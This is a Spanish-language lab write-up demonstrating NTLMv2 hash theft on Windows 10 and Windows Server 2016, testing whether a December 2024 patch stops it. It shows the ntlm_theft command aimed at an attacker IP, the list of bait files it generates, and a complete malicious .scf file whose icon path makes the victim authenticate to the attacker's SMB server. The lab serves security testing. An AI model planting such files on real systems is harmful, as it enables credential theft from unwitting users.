# NTLM Hashes

**Objetivo del Laboratorio**

Demostrar de manera práctica el funcionamiento del robo de hashes NTLMv2, mediante el uso de archivos modificados. Además, evaluaremos la efectividad del parche de seguridad lanzado por Microsoft en diciembre de 2024 (liberado en el "martes de parches") para mitigar esta vulnerabilidad. Posteriormente, verificaremos si la brecha de seguridad persiste o si ha sido corregida tras aplicar el parche.

El laboratorio inicialmente va a ser el siguiente: 

![image.png](image.png)

Vamos a estar utilizando las siguientes herramientas

**Responder:** Esta herramienta permite interceptar y manipular solicitudes de autenticación en redes Windows, simulando un servidor malicioso para multiples servicios, en este caso particular, servirá para capturar hashes NTLMv2 que la máquina víctima enviará

[https://github.com/SpiderLabs/Responder](https://github.com/SpiderLabs/Responder)

**Ntlm_theft:** Un script diseñado para generar archivos especialmente modificados que, al ser abiertos o utilizados, envían las credenciales NTLM del usuario al atacante.

[https://github.com/Greenwolf/ntlm_theft](https://github.com/Greenwolf/ntlm_theft)

El uso básico de NTLM_Theft es el siguiente: `python3 ntlm_theft.py -g modern -s 192.168.1.11 -f Important`

![image.png](image%201.png)

Estos son los archivos que nos genera el script

```bash
❯ ls
 Important-(externalcell).xlsx   Important-(icon).url             
 Important-(stylesheet).xml      Important.asx   
 Important.lnk                   Important.rtf
 Important-(frameset).docx       Important-(includepicture).docx  
 Important-(url).url             Important.htm   
 Important.m3u                   Important.wax
 Important-(fulldocx).xml        Important-(remotetemplate).docx  
 Important.application           Important.jnlp  
 Important.pdf   
```

Vamos a compartir algunos de estos archivos con nuestra máquina víctima.

En este caso, por motivos prácticos, nos enfocaremos en el archivo Excel. Luego, iniciaremos **Responder** en la máquina atacante para que simule ser un servidor SMB. Esto permitirá que, al habilitar la edición del archivo en la máquina víctima, se intente una autenticación automática.

![image.png](image%202.png)

![image.png](image%203.png)

![image.png](image%204.png)

![image.png](image%205.png)

Vamos a aplicar el parche más reciente liberado por Microsoft para Windows 10.

![image.png](image%206.png)

Una vez aplicado el parche, ejecutamos nuevamente el archivo Excel y observamos que la vulnerabilidad persiste.

![image.png](image%207.png)

## Windows Server 2016

![image.png](image%208.png)

Para probar el comportamiento de un tipo de archivo que no requiere ser abierto para explotar la vulnerabilidad, necesitamos utilizar un sistema operativo más antiguo. En este caso, optamos por un Windows Server 2016.

La estructura del archivo malicioso es la siguiente. Cabe destacar que el intento de obtener el recurso del servidor SMB, configurado previamente con Responder, ocurre en el momento en que el sistema carga la imagen o el icono asociado al archivo.

```
[Shell]
Command=2
IconFile=\\192.168.1.11\tools\nc.ico
[Taskbar]
Command=ToggleDesktop
```

Aquí podemos observar que Windows Server ya se encuentra conectado a nuestra red.

![image.png](image%209.png)

Solo basta con ingresar a la ruta donde se almacena el archivo, para luego capturar los hashes correspondientes.

![image.png](image%2010.png)

![image.png](image%2011.png)

Vemos que actualmente no cuenta con los últimos parches

![image.png](image%2012.png)

Vamos al catalogo de Microsoft Update, para descargar e instalarlo manualmente.

![image.png](image%2013.png)

Sin embargo, para nuestra sorpresa, vemos que no se pudo parchar el bajo el KB → (KB5048671)

![image.png](image%2014.png)

**Conclusión del Laboratorio**:

Este laboratorio demostró la eficacia del robo de hashes NTLM utilizando archivos modificados, incluso tras la aplicación del parche de seguridad lanzado por Microsoft en diciembre de 2024. En el caso de **Windows 10**, aunque el parche fue correctamente instalado, se continuó capturando hashes NTLM simplemente abriendo archivos modificados, como documentos Excel o cualquier otro proporcionado por herramientas específicas como ntlm_theft. Esto resalta una posible persistencia de la vulnerabilidad en entornos donde la interacción con archivos específicos es suficiente para desencadenar el robo de hashes.

En cuanto a **Windows Server 2016**, se observó que, no es necesario siquiera abrir el archivo, y a pesar de intentar instalar manualmente el parche de seguridad, este no fue aplicable al equipo. Esto indica una limitación significativa, donde ciertos sistemas operativos, como Windows Server 2016, puedan quedar fuera de la cobertura de las últimas mitigaciones de seguridad (En el entorno).